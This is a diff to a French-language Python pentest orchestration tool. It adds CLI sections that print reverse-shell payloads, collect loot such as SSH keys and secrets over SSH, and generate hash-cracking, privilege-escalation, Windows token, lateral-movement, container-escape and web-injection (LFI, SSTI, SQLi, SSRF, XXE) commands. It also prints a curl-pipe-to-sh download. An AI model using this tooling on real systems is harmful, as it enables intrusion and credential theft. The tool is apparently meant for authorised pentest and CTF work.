+                        svc_name = best[0].get("service", {}).get("service_name", "bash")
+
+                shells = best_shells(svc_name, lhost, lport)
+                console.print(f"\n[bold green]● Reverse shells pour {svc_name} "
+                              f"(LHOST={lhost} LPORT={lport})[/bold green]")
+                for sh in shells[:3]:
+                    console.print(f"\n  [cyan]{sh.name}[/cyan] — {sh.description}")
+                    console.print(f"  [green]{sh.payload[:120]}{'...' if len(sh.payload)>120 else ''}[/green]")
+                    if sh.b64_cmd:
+                        console.print(f"  [dim]Base64 : {sh.b64_cmd[:100]}...[/dim]")
+                    if sh.listener:
+                        console.print(f"  [yellow]Listener : {sh.listener.split(chr(10))[0]}[/yellow]")
+                console.print(f"\n  [dim]→ --all-shells pour tous les formats dans un fichier[/dim]")
+
+    # ── Loot Collector ────────────────────────────────────────────────────────
+    if args.loot:
+        if not getattr(args, "ssh_scan", None):
+            console.print("[yellow][!] --loot nécessite --ssh-scan pour se connecter à la cible.[/yellow]")
+        elif "_ssh_client_obj" in globals():
+            console.print(f"\n[bold yellow]● Loot Collector — {target}[/bold yellow]")
+            from modules.loot_collector import collect_loot as _collect_loot
+            loot_items = _collect_loot(globals()["_ssh_client_obj"], target)
+            if loot_items:
+                cat_colors = {"ctf":"bold red","ssh_key":"red","secret":"yellow",
+                              "system":"orange1","config":"blue","web":"cyan",
+                              "history":"dim","interesting":"green"}
+                for item in loot_items:
+                    col = cat_colors.get(item.category, "white")
+                    crit = " [bold red][CRITIQUE][/bold red]" if item.is_critical else ""
+                    console.print(f"\n  [{col}][{item.category.upper()}][/{col}]{crit} {item.path}")
+                    console.print(f"  [dim]{item.description}[/dim]")
+                    if item.preview:
+                        preview = item.preview[:200].replace("\n", " | ")
+                        console.print(f"  [green]{preview}[/green]")
+            else:
+                console.print("  [dim]Aucun fichier sensible trouvé.[/dim]")
+        else:
+            console.print("[yellow][!] Session SSH non disponible. Lancez d'abord --ssh-scan.[/yellow]")
+
+    # ── AD Enumeration ────────────────────────────────────────────────────────
+    if args.ad_enum or args.ad_auto:
+        ad_result = analyze_ad(
+            results=results, output_dir=args.output_dir,
+            auto=args.ad_auto,
+        )
+        if ad_result is None:
+            console.print("\n[dim][AD] Aucun indicateur Active Directory détecté dans le scan.[/dim]")
+            console.print("[dim]     Ports AD attendus : 88 (Kerberos), 389 (LDAP), 445 (SMB), 3268 (GC)[/dim]")
+        else:
+            ad = ad_result.ad_info
+            console.print(f"\n[bold cyan]{'=' * 62}[/bold cyan]")
+            console.print(f"[bold cyan]  ACTIVE DIRECTORY — {ad.domain} ({ad.dc_ip})[/bold cyan]")
+            console.print(f"[bold cyan]{'=' * 62}[/bold cyan]")
+            console.print(f"  DC       : [bold]{ad.dc_ip}[/bold]")
+            console.print(f"  Domaine  : [bold]{ad.domain}[/bold]")
+            console.print(f"  NetBIOS  : [bold]{ad.domain_nb}[/bold]")
+            if ad.hostname:
+                console.print(f"  Hostname : {ad.hostname}")
+            console.print("")
+
+            for cmd in ad_result.commands:
+                console.print(f"[bold blue]── {cmd.title}[/bold blue]")
+                console.print(f"[dim]   {cmd.description}[/dim]")
+                for line in cmd.command.split("\n")[:4]:
+                    console.print(f"   [green]{line}[/green]")
+                console.print("")
+
+            if ad_result.auto_results:
+                console.print(f"[bold yellow]── Résultats --ad-auto[/bold yellow]")
+                for title, output in ad_result.auto_results.items():
+                    if output and "[!]" not in output:
+                        console.print(f"\n  [cyan]{title}[/cyan]")
+                        for line in output.split("\n")[:8]:
+                            console.print(f"  {line}")
+            console.print(f"[bold cyan]{'=' * 62}[/bold cyan]\n")
+
+    # ── Hash Cracker ──────────────────────────────────────────────────────────
+    if args.hashcrack:
+        console.print("\n[bold yellow]● Hash Cracker[/bold yellow]")
+        import os as _os
+        _os.makedirs(args.output_dir, exist_ok=True)
+        if args.hashcrack != "auto":
+            # Hash fourni directement
+            info = detect_hash_type(args.hashcrack)
+            if info:
+                console.print(f"\n  Type détecté : [cyan]{info.hash_type}[/cyan] "
+                              f"(hashcat -m {info.hashcat_mode})")
+                console.print(f"  Difficulté   : [{'red' if info.difficulty=='hard' else 'yellow' if info.difficulty=='medium' else 'green'}]{info.difficulty.upper()}[/{'red' if info.difficulty=='hard' else 'yellow' if info.difficulty=='medium' else 'green'}]")
+                hash_file = f"{args.output_dir}/hash.txt"
+                with open(hash_file, "w") as hf:
+                    hf.write(args.hashcrack + "\n")
+                cmds = generate_crack_commands(hash_file, info, args.output_dir)
+                for line in cmds:
+                    if line.startswith("#"):
+                        console.print(f"  [dim]{line}[/dim]")
+                    elif line:
+                        console.print(f"  [green]{line}[/green]")
+                    else:
+                        console.print("")
+            else:
+                console.print(f"  [yellow]Type de hash non reconnu : {args.hashcrack[:60]}[/yellow]")
+        else:
+            # Cherche dans les résultats et le loot
+            all_text = " ".join(
+                str(r.get("service", {}).get("banner", "")) for r in results
+            )
+            found = detect_hashes_in_text(all_text)
+            if found:
+                for h, info in found[:5]:
+                    console.print(f"\n  [cyan]{info.hash_type}[/cyan] (mode {info.hashcat_mode})")
+                    console.print(f"  [dim]{h[:60]}...[/dim]" if len(h) > 60 else f"  [dim]{h}[/dim]")
+                    hash_file = f"{args.output_dir}/hashes_{info.hash_type.lower().replace(' ','_')}.txt"
+                    with open(hash_file, "a") as hf:
+                        hf.write(h + "\n")
+                    console.print(f"  [green]hashcat -m {info.hashcat_mode} {hash_file} /usr/share/wordlists/rockyou.txt -O[/green]")
+            else:
+                console.print("  [dim]Aucun hash détecté automatiquement. "
+                              "Fournissez le hash directement : --hashcrack '$6$...'[/dim]")
+
+    # ── Vhost Discovery ───────────────────────────────────────────────────────
+    if args.vhost:
+        custom_domain = "" if args.vhost == "auto" else args.vhost
+        vhost_results = analyze_vhosts(results, custom_domain=custom_domain)
+        if vhost_results:
+            console.print(f"\n[bold green]● Vhost Discovery ({len(vhost_results)} service(s) HTTP)[/bold green]")
+            for vr in vhost_results:
+                t = vr.target
+                console.print(f"\n  [cyan]{t.protocol}://{t.host}:{t.port}[/cyan]  domaine: [bold]{t.domain}[/bold]")
+                for cmd in vr.commands[:3]:  # Top 3 commandes
+                    console.print(f"\n  [bold dim]{cmd['title']}[/bold dim]")
+                    for line in cmd["cmd"].split("\n")[:4]:
+                        if line.startswith("#"):
+                            console.print(f"  [dim]{line}[/dim]")
+                        elif line.strip():
+                            console.print(f"  [green]{line}[/green]")
+        else:
+            console.print("\n[dim]Aucun service HTTP/HTTPS détecté dans le scan.[/dim]")
+
+    # ── Privesc Checklist ────────────────────────────────────────────────────
+    if args.privesc:
+        from modules.kill_chain import _guess_os
+        os_target = _guess_os(results)
+        if os_target == "unknown":
+            os_target = "linux"
+        checks = get_privesc_checklist(os_target)
+        console.print(f"\n[bold magenta]● Privesc Checklist — {os_target.upper()} "
+                      f"({len(checks)} vecteurs)[/bold magenta]")
+        cat_colors = {"sudo":"yellow","suid":"red","cron":"cyan","path":"blue",
+                      "service":"orange1","kernel":"magenta","misc":"green"}
+        for check in checks:
+            col = cat_colors.get(check.category, "white")
+            diff_col = {"easy":"green","medium":"yellow","hard":"red"}.get(check.difficulty,"white")
+            console.print(f"\n  [{col}][{check.category.upper()}][/{col}] "
+                          f"[{diff_col}]{check.difficulty.upper()}[/{diff_col}]  "
+                          f"[bold]{check.title}[/bold]")
+            console.print(f"  [dim]{check.description[:100]}[/dim]")
+            # Affiche la commande de vérification (première ligne seulement)
+            first_cmd = check.check_cmd.split("\n")[0]
+            console.print(f"  [green]Check : {first_cmd}[/green]")
+            # Affiche l'exploit (première ligne)
+            first_exploit = [l for l in check.exploit_cmd.split("\n") if l.strip() and not l.startswith("#")]
+            if first_exploit:
+                console.print(f"  [yellow]Exploit: {first_exploit[0][:90]}[/yellow]")
+
+    # ── Shell Upgrader ────────────────────────────────────────────────────────
+    if args.upgrade_shell:
+        from modules.kill_chain import _guess_os
+        os_target = _guess_os(results) if results else "linux"
+        if os_target == "unknown":
+            os_target = "linux"
+        lhost = args.lhost or "LHOST"
+        lport = getattr(args, "lport", 4445) or 4445
+
+        console.print(f"\n[bold cyan]{'=' * 62}[/bold cyan]")
+        console.print(f"[bold cyan]  SHELL UPGRADER — {os_target.upper()}[/bold cyan]")
+        console.print(f"[bold cyan]{'=' * 62}[/bold cyan]")
+
+        quick = get_quick_upgrade(os_target)
+        console.print(f"\n[bold]One-liner rapide :[/bold]")
+        console.print(f"[green]{quick}[/green]\n")
+
+        if os_target == "linux":
+            guides = get_linux_upgrade_guides(lhost, lport)
+        else:
+            guides = get_windows_upgrade_guides(lhost, lport)
+
+        for guide in guides[:2]:  # Top 2 méthodes
+            console.print(f"\n[bold blue]── {guide.method.upper()} — {guide.summary}[/bold blue]")
+            for step in guide.steps:
+                console.print(f"\n  [bold]{step.title}[/bold]")
+                if step.on_attacker:
+                    console.print("  [dim]Côté attaquant :[/dim]")
+                    for cmd in step.on_attacker:
+                        if cmd.startswith("#"):
+                            console.print(f"    [dim]{cmd}[/dim]")
+                        else:
+                            console.print(f"    [yellow]{cmd}[/yellow]")
+                if step.on_target:
+                    console.print("  [dim]Côté cible :[/dim]")
+                    for cmd in step.on_target:
+                        if cmd.startswith("#"):
+                            console.print(f"    [dim]{cmd}[/dim]")
+                        else:
+                            console.print(f"    [green]{cmd}[/green]")
+                for note in step.notes:
+                    console.print(f"  [dim]→ {note}[/dim]")
+
+        console.print(f"\n[bold cyan]{'=' * 62}[/bold cyan]\n")
+
+    if args.msf_script and results:
+        target_ip = target if hasattr(args, 'scan') and args.scan else (
+            results[0].get("host", "TARGET") if results else "TARGET"
+        )
+        lhost = args.lhost or ""
+        if not lhost and args.msf_script:
+            console.print("[yellow][!] --lhost non spécifié : les payloads reverse shell seront incomplets dans les scripts .rc[/yellow]")
+        created = generate_msf_scripts(results, target=target_ip, lhost=lhost, output_dir=args.output_dir)
+        if created:
+            console.print(f"\n[bold green][+] {len(created)} script(s) MSF généré(s) :[/bold green]")
+            for path in created:
+                console.print(f"    [cyan]→ {path}[/cyan]")
+            console.print(f"[dim]    Lancer avec : msfconsole -r {created[0]}[/dim]")
+
     if args.verbose and unmatched_services:
         console.print(
             f"\n[yellow][!] {len(unmatched_services)} service(s) non couvert(s) par la base locale "
@@ -673,7 +1500,9 @@ Exemples d'utilisation :
 
     # ── Mode interactif ─────────────────────────────────────────────────────
     if args.interactive:
-        run_interactive(results, output_dir=args.output_dir)
+        run_interactive(results, output_dir=args.output_dir,
+                    lhost=args.lhost or "",
+                    lport=getattr(args, 'lport', 4444) or 4444)
         # On laisse continuer pour les exports éventuels
 
     # ── Contexte Active Directory ────────────────────────────────────────────
@@ -765,6 +1594,622 @@ Exemples d'utilisation :
     console.print(Rule(style="dim"))
     console.print("[dim]Scan terminé.[/dim]\n")
 
+
+
+    # ── Token Privilege Helper ───────────────────────────────────────────────
+    if args.tokens is not None:
+        whoami_input = args.tokens if args.tokens not in ("all", None) else ""
+        checks = analyze_whoami_priv(whoami_input) if whoami_input else get_token_checks()
+
+        console.print(f"\n[bold yellow]{'='*62}[/bold yellow]")
+        console.print(f"[bold yellow]  TOKEN PRIVILEGE HELPER — Windows[/bold yellow]")
+        console.print(f"[bold yellow]{'='*62}[/bold yellow]")
+
+        if whoami_input:
+            console.print(f"  [dim]Filtré sur les privilèges détectés dans whoami /priv[/dim]")
+        else:
+            console.print(f"  [dim]{len(checks)} checks — tous les token privileges Windows[/dim]")
+        console.print(f"  [dim]Commencer par : whoami /priv  puis  whoami /groups[/dim]")
+
+        cat_colors = {
+            "potato":    "red",
+            "debug":     "magenta",
+            "ownership": "yellow",
+            "backup":    "cyan",
+            "driver":    "blue",
+            "misc":      "green",
+        }
+        cat_labels = {
+            "potato":    "Potato Attacks (SeImpersonate / SeAssignPrimaryToken)",
+            "debug":     "SeDebugPrivilege — LSASS dump",
+            "ownership": "SeTakeOwnershipPrivilege",
+            "backup":    "SeBackupPrivilege / SeRestorePrivilege",
+            "driver":    "SeLoadDriverPrivilege — BYOVD",
+            "misc":      "Autres techniques (AlwaysInstallElevated, Incognito...)",
+        }
+
+        current_cat = ""
+        for check in checks:
+            if check.category != current_cat:
+                current_cat = check.category
+                col = cat_colors.get(check.category, "white")
+                label = cat_labels.get(check.category, check.category)
+                console.print(f"\n[bold {col}]── {label}[/bold {col}]")
+
+            sev_color = {"critical": "red", "high": "yellow", "medium": "blue"}.get(
+                check.severity, "white"
+            )
+            diff_color = {"easy": "green", "medium": "yellow", "hard": "red"}.get(
+                check.difficulty, "white"
+            )
+            priv_tag = (f" [dim]← {check.privilege}[/dim]"
+                        if check.privilege != "*" else "")
+            console.print(
+                f"\n  [{sev_color}][{check.severity.upper()}][/{sev_color}] "
+                f"[{diff_color}]{check.difficulty}[/{diff_color}]  "
+                f"[bold]{check.title}[/bold]{priv_tag}"
+            )
+            console.print(f"  [dim]{check.description[:130]}[/dim]")
+
+            console.print(f"  [dim]Check :[/dim]")
+            for line in check.check_cmd.split("\n")[:3]:
+                if line.startswith("#"):
+                    console.print(f"  [dim]{line}[/dim]")
+                elif line.strip():
+                    console.print(f"  [green]{line}[/green]")
+
+            console.print(f"  [dim]Exploit :[/dim]")
+            exploit_lines = [l for l in check.exploit_cmd.split("\n")
+                             if l.strip() and not l.startswith("#")]
+            for line in exploit_lines[:4]:
+                console.print(f"  [yellow]{line}[/yellow]")
+
+            for note in check.notes[:1]:
+                console.print(f"  [dim]• {note}[/dim]")
+
+        console.print(f"\n[bold yellow]{'='*62}[/bold yellow]")
+        console.print(f"[dim]→ --tokens 'SeImpersonatePrivilege  Enabled\n...' pour filtrer[/dim]")
+        console.print(f"[dim]→ Télécharger GodPotato : https://github.com/BeichenDream/GodPotato[/dim]\n")
+
+    # ── Cloud Enum ────────────────────────────────────────────────────────────
+    if args.cloud:
+        cloud = enumerate_cloud(results)
+
+        console.print(f"\n[bold cyan]{'='*62}[/bold cyan]")
+        console.print(f"[bold cyan]  CLOUD ENUMERATION[/bold cyan]")
+        console.print(f"[bold cyan]{'='*62}[/bold cyan]")
+
+        prov_str = ", ".join(cloud.detected_providers).upper() or "générique"
+        console.print(f"  Providers : [yellow]{prov_str}[/yellow]")
+        console.print(f"  SSRF context : {'[green]oui — tester metadata services[/green]' if cloud.ssrf_context else '[dim]non détecté[/dim]'}")
+        console.print(f"  Checks : [yellow]{len(cloud.checks)}[/yellow]")
+
+        if cloud.bucket_candidates:
+            console.print(f"  Candidats buckets : [dim]{', '.join(cloud.bucket_candidates[:6])}...[/dim]")
+
+        prov_colors = {"aws": "yellow", "azure": "blue", "gcp": "red", "generic": "cyan"}
+        cat_labels  = {
+            "storage": "Stockage (S3 / Blob / GCS)",
+            "iam":     "IAM & Credentials",
+            "metadata":"Metadata Service (SSRF)",
+            "secrets": "Secrets & Tokens",
+            "misc":    "Outils multi-cloud",
+        }
+        current_cat = ""
+        for check in cloud.checks:
+            if check.category != current_cat:
+                current_cat = check.category
+                col = prov_colors.get(check.provider, "white")
+                console.print(f"\n[bold {col}]── [{check.provider.upper()}] {cat_labels.get(check.category, check.category)}[/bold {col}]")
+
+            sev_col = {"critical": "red", "high": "yellow"}.get(check.severity, "blue")
+            console.print(f"\n  [{sev_col}][{check.severity.upper()}][/{sev_col}]  [bold]{check.title}[/bold]")
+            console.print(f"  [dim]{check.description[:110]}[/dim]")
+            for line in [l for l in check.exploit_cmd.split("\n") if l.strip() and not l.startswith("#")][:4]:
+                console.print(f"  [green]{line}[/green]")
+            for note in check.notes[:1]:
+                console.print(f"  [dim]• {note}[/dim]")
+
+        console.print(f"\n[bold cyan]{'='*62}[/bold cyan]")
+        for note in cloud.notes[:6]:
+            console.print(f"  [dim]{note}[/dim]")
+        console.print("")
+
+    # ── Lateral Movement ─────────────────────────────────────────────────────
+    if args.lateral:
+        lat = generate_lateral_commands(results)
+
+        console.print(f"\n[bold magenta]{'='*62}[/bold magenta]")
+        console.print(f"[bold magenta]  LATERAL MOVEMENT — {lat.domain}[/bold magenta]")
+        console.print(f"[bold magenta]{'='*62}[/bold magenta]")
+        console.print(f"  DC détecté    : {'[green]oui[/green]' if lat.dc_detected else '[dim]non[/dim]'}")
+        console.print(f"  MSSQL détecté : {'[green]oui[/green]' if lat.mssql_detected else '[dim]non[/dim]'}")
+        console.print(f"  RDP détecté   : {'[green]oui[/green]' if lat.rdp_detected else '[dim]non[/dim]'}")
+        console.print(f"  Techniques    : [yellow]{len(lat.techniques)}[/yellow]")
+
+        cat_labels = {
+            "dcom":       ("DCOM",                          "cyan"),
+            "wmi":        ("WMI natif",                     "blue"),
+            "mssql":      ("MSSQL Linked Servers",          "yellow"),
+            "laps":       ("LAPS",                          "green"),
+            "delegation": ("Délégation Kerberos",           "red"),
+            "coercion":   ("Coercition NTLM",               "bold red"),
+            "adcs":       ("AD CS — Certificate Services",  "bold yellow"),
+            "shadow":     ("Shadow Credentials",            "magenta"),
+            "rdp":        ("RDP Hijacking",                 "blue"),
+        }
+        current_cat = ""
+        for tech in lat.techniques:
+            if tech.category != current_cat:
+                current_cat = tech.category
+                label, col = cat_labels.get(tech.category, (tech.category, "white"))
+                console.print(f"\n[bold {col}]── {label}[/bold {col}]")
+
+            sev_col  = {"critical": "red", "high": "yellow"}.get(tech.severity, "blue")
+            diff_col = {"easy": "green", "medium": "yellow", "hard": "red"}.get(tech.difficulty, "white")
+            console.print(
+                f"\n  [{sev_col}][{tech.severity.upper()}][/{sev_col}] "
+                f"[{diff_col}]{tech.difficulty}[/{diff_col}]  [bold]{tech.title}[/bold]"
+            )
+            console.print(f"  [dim]{tech.description[:120]}[/dim]")
+            console.print(f"  [dim]Check :[/dim]")
+            for line in tech.check_cmd.split("\n")[:3]:
+                console.print(f"  [dim]{line}[/dim]" if line.startswith("#") else f"  [green]{line}[/green]")
+            console.print(f"  [dim]Exploit :[/dim]")
+            for line in [l for l in tech.exploit_cmd.split("\n") if l.strip() and not l.startswith("#")][:4]:
+                console.print(f"  [yellow]{line}[/yellow]")
+            for note in tech.notes[:1]:
+                console.print(f"  [dim]• {note}[/dim]")
+
+        console.print(f"\n[bold magenta]{'='*62}[/bold magenta]")
+        for note in lat.notes[:5]:
+            console.print(f"  [dim]{note}[/dim]")
+        console.print("")
+
+    # ── Wordlist Builder ──────────────────────────────────────────────────────
+    if args.wordlist is not None:
+        _wl_out = (args.wordlist
+                   if args.wordlist not in ("auto", None)
+                   else "")
+        _wl_result = build_wordlists(
+            results,
+            output_file=_wl_out,
+            custom_words=getattr(args, "custom_words", []) or [],
+        )
+
+        console.print(f"\n[bold green]{'='*62}[/bold green]")
+        console.print(f"[bold green]  WORDLIST BUILDER[/bold green]")
+        console.print(f"[bold green]{'='*62}[/bold green]")
+
+        s = _wl_result.stats
+        console.print(f"  Cible   : [cyan]{_wl_result.target}[/cyan]")
+        if _wl_result.domain:
+            console.print(f"  Domaine : [cyan]{_wl_result.domain}[/cyan]")
+        if _wl_result.company:
+            console.print(f"  Société : [cyan]{_wl_result.company}[/cyan]")
+        console.print(f"\n  [bold]Statistiques[/bold]")
+        console.print(f"  Mots de base   : [yellow]{s['base_words']}[/yellow]")
+        console.print(f"  Total (mutés)  : [green]{s['total_words']}[/green]")
+        console.print(f"  Avec symbole   : {s['words_with_sym']}  |  Avec chiffre : {s['words_with_num']}")
+        console.print(f"  Longueur       : min={s['min_len']} / moy={s['avg_len']} / max={s['max_len']}")
+        console.print(f"  Mots ≥8 chars  : {s['words_gte8']}")
+
+        # Aperçu
+        console.print(f"\n  [bold]Mots de base extraits[/bold]")
+        for w in _wl_result.base_words[:20]:
+            console.print(f"  [dim]{w}[/dim]")
+        if len(_wl_result.base_words) > 20:
+            console.print(f"  [dim]  ... {len(_wl_result.base_words)-20} autres[/dim]")
+
+        console.print(f"\n  [bold]Aperçu wordlist finale (25 premiers mots)[/bold]")
+        for w in _wl_result.all_words[:25]:
+            console.print(f"  [green]{w}[/green]")
+        if len(_wl_result.all_words) > 25:
+            console.print(f"  [dim]  ... {len(_wl_result.all_words)-25} autres[/dim]")
+
+        if _wl_out:
+            console.print(f"\n  [bold green]✓ Wordlist écrite → {_wl_out}[/bold green]  "
+                          f"[dim]({s['total_words']} lignes)[/dim]")
+        else:
+            console.print(f"\n  [dim]→ Ajouter un chemin pour exporter : --wordlist /tmp/cible.txt[/dim]")
+
+        # CeWL
+        console.print(f"\n[bold yellow]── CeWL — Spider web pour enrichir la wordlist[/bold yellow]")
+        for line in _wl_result.cewl_cmds[:12]:
+            if line.startswith("#"):
+                console.print(f"  [dim]{line}[/dim]")
+            elif line.strip():
+                console.print(f"  [green]{line}[/green]")
+            else:
+                console.print("")
+
+        # Usernames
+        console.print(f"\n[bold yellow]── Génération d'usernames[/bold yellow]")
+        for line in _wl_result.username_cmds[:12]:
+            if line.startswith("#"):
+                console.print(f"  [dim]{line}[/dim]")
+            elif line.strip():
+                console.print(f"  [green]{line}[/green]")
+            else:
+                console.print("")
+
+        # Règles hashcat
+        console.print(f"\n[bold yellow]── Règles hashcat[/bold yellow]")
+        for line in _wl_result.hashcat_rules[:8]:
+            if line.startswith("#"):
+                console.print(f"  [dim]{line}[/dim]")
+            elif line.strip():
+                console.print(f"  [green]{line}[/green]")
+            else:
+                console.print("")
+
+        for note in _wl_result.notes:
+            console.print(f"\n  [dim]{note}[/dim]")
+
+        console.print(f"[bold green]{'='*62}[/bold green]\n")
+
+    # ── Container Escape ─────────────────────────────────────────────────────
+    if args.container is not None:
+        quick_mode = (args.container == "quick")
+        checks = get_quick_container_checks() if quick_mode else get_container_escape_checklist()
+
+        console.print(f"\n[bold cyan]{'='*62}[/bold cyan]")
+        console.print(f"[bold cyan]  CONTAINER ESCAPE{'— Quick' if quick_mode else ''}[/bold cyan]")
+        console.print(f"[bold cyan]{'='*62}[/bold cyan]")
+        console.print(f"  [dim]{len(checks)} vérifications • Exécuter depuis un shell dans le conteneur[/dim]")
+
+        # Analyse du scan pour services conteneurs exposés
+        _lhost_ct = args.lhost or "LHOST"
+        ext_checks = analyze_container_host(results, lhost=_lhost_ct)
+        if ext_checks:
+            console.print(f"\n[bold red]── Services conteneurs exposés ({len(ext_checks)} détecté(s)) ──[/bold red]")
+            for ec in ext_checks:
+                sev_color = "red" if ec.severity == "critical" else "yellow"
+                console.print(f"\n  [{sev_color}][{ec.severity.upper()}][/{sev_color}] [bold]{ec.title}[/bold]")
+                console.print(f"  [dim]{ec.description}[/dim]")
+                for line in ec.command.split("\n")[:6]:
+                    if line.startswith("#"):
+                        console.print(f"  [dim]{line}[/dim]")
+                    elif line.strip():
+                        console.print(f"  [green]{line}[/green]")
+                    else:
+                        console.print("")
+                for note in ec.notes:
+                    console.print(f"  [dim]• {note}[/dim]")
+
+        # Checklist interne
+        cat_colors = {
+            "detect":     "dim",
+            "capability": "red",
+            "socket":     "bold red",
+            "mount":      "yellow",
+            "escape":     "magenta",
+            "kubernetes": "cyan",
+            "cve":        "bold yellow",
+        }
+        current_cat = ""
+        for check in checks:
+            if check.category != current_cat:
+                current_cat = check.category
+                cat_label = {
+                    "detect":     "Détection — suis-je dans un conteneur ?",
+                    "capability": "Capabilities dangereuses",
+                    "socket":     "Docker Socket",
+                    "mount":      "Montages sensibles",
+                    "kubernetes": "Kubernetes",
+                    "cve":        "CVEs connues",
+                }.get(check.category, check.category)
+                col = cat_colors.get(check.category, "white")
+                console.print(f"\n[bold {col}]── {cat_label}[/bold {col}]")
+
+            sev_color = {"critical": "red", "high": "yellow", "medium": "blue"}.get(check.severity, "white")
+            diff_color = {"easy": "green", "medium": "yellow", "hard": "red"}.get(check.difficulty, "white")
+            console.print(
+                f"\n  [{sev_color}][{check.severity.upper()}][/{sev_color}] "
+                f"[{diff_color}]{check.difficulty}[/{diff_color}]  "
+                f"[bold]{check.title}[/bold]"
+            )
+            console.print(f"  [dim]{check.description[:120]}[/dim]")
+            console.print(f"  [dim]Check :[/dim]")
+            for line in check.check_cmd.split("\n")[:3]:
+                if line.startswith("#"):
+                    console.print(f"  [dim]{line}[/dim]")
+                elif line.strip():
+                    console.print(f"  [green]{line}[/green]")
+            console.print(f"  [dim]Exploit :[/dim]")
+            exploit_lines = [l for l in check.exploit_cmd.split("\n")
+                             if l.strip() and not l.startswith("#")]
+            for line in exploit_lines[:3]:
+                console.print(f"  [yellow]{line}[/yellow]")
+            for note in check.notes[:1]:
+                console.print(f"  [dim]• {note}[/dim]")
+
+        console.print(f"\n[bold cyan]{'='*62}[/bold cyan]")
+        if not quick_mode:
+            console.print(f"[dim]→ --container quick pour les vérifications rapides uniquement[/dim]")
+        console.print(f"[dim]→ deepce.sh automatise la détection : "
+                      f"curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh[/dim]\n")
+
+    # ── Web Payload Generator ─────────────────────────────────────────────────
+    if args.web_payloads is not None:
+        from modules.nmap_parser import NmapService as _NmapService
+        # Construire la liste des services
+        svc_objects = []
+        for result in results:
+            svc = result.get("service", {})
+            svc_objects.append(_NmapService(
+                host=svc.get("host", ""), port=svc.get("port", 0),
+                protocol=svc.get("protocol", "tcp"), state="open",
+                service_name=svc.get("service_name", ""), product=svc.get("product", ""),
+                version=svc.get("version", ""), banner=svc.get("banner", ""),
+            ))
+
+        _lhost_wp = args.lhost or "LHOST"
+        _lport_wp = getattr(args, "lport", 4444) or 4444
+        wp_results = analyze_web_payloads(svc_objects, lhost=_lhost_wp, lport=_lport_wp)
+
+        if not wp_results:
+            console.print("\n[dim]Aucun service HTTP/HTTPS détecté. "
+                          "Vérifier que le scan couvre les ports web (80, 443, 8080...).[/dim]")
+        else:
+            for wp in wp_results:
+                console.print(f"\n[bold green]{'='*62}[/bold green]")
+                console.print(
+                    f"[bold green]  WEB PAYLOADS — "
+                    f"{wp.protocol.upper()}://{wp.host}:{wp.port}[/bold green]"
+                )
+                console.print(f"[bold green]{'='*62}[/bold green]")
+                if wp.detected_tech:
+                    console.print(
+                        f"  Stack : [cyan]{', '.join(wp.detected_tech)}[/cyan]  "
+                        f"OS : [cyan]{wp.os_hint}[/cyan]"
+                    )
+                for note in wp.notes:
+                    console.print(f"  [dim]{note}[/dim]")
+
+                # ── LFI ───────────────────────────────────────────────────────
+                console.print(f"\n[bold yellow]── LFI / Path Traversal ({len(wp.lfi_payloads)} payloads)[/bold yellow]")
+                for p in wp.lfi_payloads[:8]:
+                    console.print(f"  [green]{p.payload}[/green]")
+                    if p.description:
+                        console.print(f"  [dim]  → {p.description}[/dim]")
+                console.print(f"  [dim]  ({len(wp.lfi_payloads)-8} autres payloads disponibles)[/dim]")
+
+                # ── SSTI ──────────────────────────────────────────────────────
+                console.print(f"\n[bold yellow]── SSTI — Moteurs détectés ({len(wp.ssti_engines)})[/bold yellow]")
+                for engine in wp.ssti_engines:
+                    console.print(f"\n  [cyan][{engine.name}][/cyan]  "
+                                  f"[dim]tech: {', '.join(engine.tech)}[/dim]")
+                    console.print(f"  [dim]Détection :[/dim] [green]{engine.detect}[/green]")
+                    for line in engine.rce_linux.split("\n")[:4]:
+                        if line.startswith("#"):
+                            console.print(f"  [dim]{line}[/dim]")
+                        elif line.strip():
+                            console.print(f"  [yellow]{line}[/yellow]")
+                    if engine.notes:
+                        console.print(f"  [dim]Note : {engine.notes[:100]}[/dim]")
+
+                # ── SQLi ──────────────────────────────────────────────────────
+                console.print(f"\n[bold yellow]── SQLi — DBMS ({len(wp.sqli_entries)})[/bold yellow]")
+                for sqli in wp.sqli_entries:
+                    console.print(f"\n  [cyan][{sqli.dbms}][/cyan]")
+                    console.print(f"  [dim]Error-based :[/dim]")
+                    for line in sqli.error_based.split("\n")[:2]:
+                        if line.strip():
+                            console.print(f"  [green]{line.strip()}[/green]")
+                    console.print(f"  [dim]Blind time   :[/dim]")
+                    for line in sqli.blind_time.split("\n")[:2]:
+                        if line.strip() and not line.startswith("#"):
+                            console.print(f"  [green]{line.strip()}[/green]")
+                    if sqli.rce_cmd:
+                        console.print(f"  [dim]RCE (si privs) :[/dim]")
+                        for line in sqli.rce_cmd.split("\n")[:2]:
+                            if line.strip() and not line.startswith("#"):
+                                console.print(f"  [red]{line.strip()}[/red]")
+
+                # ── SSRF ──────────────────────────────────────────────────────
+                console.print(f"\n[bold yellow]── SSRF Bypasses ({len(wp.ssrf_payloads)} payloads)[/bold yellow]")
+                for p in wp.ssrf_payloads[:6]:
+                    console.print(f"  [green]{p.payload}[/green]  [dim]{p.description}[/dim]")
+
+                # ── XXE ───────────────────────────────────────────────────────
+                console.print(f"\n[bold yellow]── XXE ({len(wp.xxe_payloads)} templates)[/bold yellow]")
+                for p in wp.xxe_payloads[:2]:
+                    console.print(f"\n  [cyan]{p.name}[/cyan]")
+                    for line in p.payload.split("\n")[:4]:
+                        console.print(f"  [green]{line}[/green]")
+
+                # ── sqlmap ────────────────────────────────────────────────────
+                console.print(f"\n[bold yellow]── sqlmap[/bold yellow]")
+                for line in wp.sqlmap_cmds[:8]:
+                    if line.startswith("#"):
+                        console.print(f"  [dim]{line}[/dim]")
+                    elif line.strip():
+                        console.print(f"  [green]{line}[/green]")
+                    else:
+                        console.print("")
+
+                console.print(f"[bold green]{'='*62}[/bold green]\n")
+
+    # ── Pivot Helper ──────────────────────────────────────────────────────────
+    if args.pivot is not None:
+        _pivot_lhost = (args.pivot if args.pivot != "auto" else None) or args.lhost or "LHOST"
+        _pivot_lport = getattr(args, "lport", 8080) or 8080
+
+        pivot_result = generate_pivot_commands(
+            results=results,
+            lhost=_pivot_lhost,
+            lport=_pivot_lport,
+        )
+
+        console.print(f"\n[bold cyan]{'='*62}[/bold cyan]")
+        console.print(f"[bold cyan]  PIVOT HELPER — {pivot_result.target}[/bold cyan]")
+        console.print(f"[bold cyan]{'='*62}[/bold cyan]")
+        console.print(f"  LHOST : [bold]{pivot_result.lhost}[/bold]")
